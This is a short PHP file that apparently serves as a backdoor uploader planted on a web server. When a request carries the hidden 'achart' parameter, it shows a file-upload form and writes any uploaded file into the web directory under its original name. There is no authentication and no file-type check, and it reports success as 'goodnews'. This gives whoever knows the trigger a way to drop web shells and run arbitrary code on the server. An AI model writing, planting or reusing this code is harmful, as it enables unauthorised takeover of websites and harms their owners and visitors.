<?php
if(isset($_GET["achart"])){
echo "<form method=post enctype=multipart/form-data><input type=file name=ach><input type=submit name=upload value=upload></form>";if($_POST[upload]){if(@copy($_FILES[ach][tmp_name], $_FILES[ach][name])){echo "goodnews";}else{ echo "badnews";}}}
?>